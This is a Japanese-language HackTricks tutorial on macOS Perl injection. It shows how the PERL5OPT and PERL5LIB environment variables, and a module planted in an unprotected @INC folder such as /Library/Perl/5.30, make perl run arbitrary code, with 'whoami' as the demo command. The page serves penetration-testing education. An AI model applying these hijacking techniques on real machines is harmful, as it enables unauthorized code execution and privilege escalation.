# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PERL5OPT` と `PERL5LIB` 環境変数を使用して

環境変数 PERL5OPT を使用すると、perl に任意のコマンドを実行させることができます。\
例えば、このスクリプトを作成します:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
今、**env変数をエクスポート**し、**perl**スクリプトを実行します:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
別のオプションは、Perlモジュールを作成することです（例：`/tmp/pmod.pm`）：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
そして、env 変数を使用します：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## 依存関係を介して

Perlが実行されている依存関係フォルダーの順序をリストすることが可能です:
```bash
perl -e 'print join("\n", @INC)'
```
次のような結果が返されます:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
返されたフォルダのいくつかは存在しませんが、**`/Library/Perl/5.30`** は **存在** し、**SIP** によって **保護されていません** し、**SIP** によって **保護された** フォルダの **前** にあります。したがって、誰かがそのフォルダを悪用してスクリプトの依存関係を追加し、高権限の Perl スクリプトがそれを読み込むことができます。

> [!WARNING]
> ただし、そのフォルダに書き込むには **root である必要があります** し、現在ではこの **TCC プロンプト** が表示されます：

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

例えば、スクリプトが **`use File::Basename;`** をインポートしている場合、`/Library/Perl/5.30/File/Basename.pm` を作成して任意のコードを実行させることが可能です。

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
